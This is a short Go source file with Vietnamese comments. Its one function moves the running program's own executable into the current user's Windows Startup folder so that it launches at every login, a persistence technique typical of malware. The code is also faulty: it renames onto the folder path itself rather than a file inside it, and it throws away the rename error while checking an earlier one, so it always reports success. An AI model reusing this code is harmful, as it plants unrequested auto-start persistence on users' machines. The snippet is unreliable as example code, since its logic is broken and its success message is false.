package pkg

import (
	"fmt"
	"os"
)

func Movefile() {
	path, err := os.Executable()
	if err != nil {
		panic(err)
	}
	// đường dẫn file exe ban đầu
	oldPath := path

	// đường dẫn thư mục mới
	ppp := os.Getenv("APPDATA")

	newPath := ppp + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

	// sử dụng hàm Rename() để di chuyển file
	_ = os.Rename(oldPath, newPath)
	if err != nil {
		fmt.Println("Error while moving file:", err)
	} else {
		fmt.Println("File moved successfully.")
	}
}
